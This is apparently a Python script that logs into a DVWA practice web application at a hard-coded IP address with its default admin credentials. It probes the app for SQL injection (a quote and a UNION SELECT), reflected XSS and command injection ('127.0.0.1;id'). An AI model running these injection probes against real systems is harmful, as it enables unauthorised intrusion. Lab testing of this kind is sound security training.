"""详细检查 DVWA 页面"""
import asyncio
import sys
sys.stdout.reconfigure(encoding='utf-8')

import httpx

DVWA = "http://47.95.192.41:8081"

async def main():
    async with httpx.AsyncClient(timeout=15, follow_redirects=True) as client:
        # 登录
        print("[*] 登录 DVWA...")
        await client.get(f"{DVWA}/login.php")
        r = await client.post(
            f"{DVWA}/login.php",
            data={"username": "admin", "password": "password", "Login": "Login"}
        )
        print(f"    Cookie: {dict(client.cookies)}")
        
        # 检查 SQLi 页面内容
        print("\n[*] SQLi 页面内容:")
        r = await client.get(f"{DVWA}/vulnerabilities/sqli/?id=1&Submit=Submit")
        # 提取关键内容
        if "First name" in r.text:
            print("    [OK] 漏洞页面可访问")
            # 提取输出
            import re
            names = re.findall(r'First name: (\w+)', r.text)
            surnames = re.findall(r'Surname: (\w+)', r.text)
            print(f"    查询结果: {list(zip(names, surnames))}")
        else:
            print("    [WARN] 页面内容异常")
            # 打印部分内容
            text = r.text.replace('\n', ' ')[:500]
            print(f"    内容: {text}")
        
        # 测试注入
        print("\n[*] SQLi 注入测试:")
        r = await client.get(f"{DVWA}/vulnerabilities/sqli/?id=1'&Submit=Submit")
        if "error" in r.text.lower() or "syntax" in r.text.lower():
            print("    [!] 发现 SQL 错误信息")
            # 提取错误
            import re
            errors = re.findall(r'(error[^<]*|syntax[^<]*)', r.text, re.I)
            print(f"    错误: {errors[:3]}")
        else:
            print("    无明显错误信息")
            # 尝试 UNION 注入
            r = await client.get(f"{DVWA}/vulnerabilities/sqli/?id=1' UNION SELECT 1,2--&Submit=Submit")
            if "1" in r.text and "2" in r.text:
                print("    [!] UNION 注入可能成功")
        
        # 检查 XSS 页面
        print("\n[*] XSS 页面内容:")
        r = await client.get(f"{DVWA}/vulnerabilities/xss_r/?name=test123")
        if "test123" in r.text:
            print("    [OK] XSS 页面可访问，参数反射")
            # 检查是否被转义
            r = await client.get(f"{DVWA}/vulnerabilities/xss_r/?name=<test>")
            if "<test>" in r.text:
                print("    [!] 未转义，存在 XSS")
            elif "&lt;test&gt;" in r.text:
                print("    HTML 转义了")
        else:
            print("    [WARN] 页面内容异常")
        
        # 检查 CMDi 页面
        print("\n[*] CMDi 页面内容:")
        r = await client.get(f"{DVWA}/vulnerabilities/exec/?ip=127.0.0.1")
        if "Ping" in r.text or "ping" in r.text:
            print("    [OK] CMDi 页面可访问")
            # 测试注入
            r = await client.get(f"{DVWA}/vulnerabilities/exec/?ip=127.0.0.1;id")
            if "uid=" in r.text:
                print("    [!] CMDi 注入成功")
                import re
                uid = re.search(r'uid=\d+\([^)]+\)', r.text)
                if uid:
                    print(f"    输出: {uid.group()}")
            else:
                print("    无命令输出")
        else:
            print("    [WARN] 页面内容异常")

asyncio.run(main())
